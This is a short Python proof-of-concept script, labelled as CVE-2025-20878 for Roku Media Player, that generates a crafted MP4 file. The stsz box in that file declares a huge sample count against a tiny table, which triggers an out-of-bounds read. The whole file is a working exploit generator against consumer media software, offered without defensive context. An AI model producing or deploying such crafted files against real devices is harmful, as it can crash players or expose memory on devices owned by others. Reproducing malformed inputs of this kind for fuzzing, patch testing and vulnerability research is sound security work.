#!/usr/bin/env python3
"""CVE-2025-20878 — Roku Media Player. MP4 with a corrupted stsz (sample-size)
box: declared count far exceeds the table -> OOB read."""
import struct, sys
from pathlib import Path

def _box(t, body): return struct.pack(">I", 8 + len(body)) + t + body

def build() -> bytes:
    ftyp = _box(b"ftyp", b"isom\x00\x00\x02\x00isomiso2avc1mp41")
    stsz = _box(b"stsz", struct.pack(">II", 0, 0x7FFFFFFF) + b"\x00\x00\x01\x00")
    stbl = _box(b"stbl", stsz)
    moov = _box(b"moov", _box(b"trak", _box(b"mdia", _box(b"minf", stbl))))
    return ftyp + moov + _box(b"mdat", b"\x00" * 32)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2025-20878.mp4")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2025-20878 MP4 -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
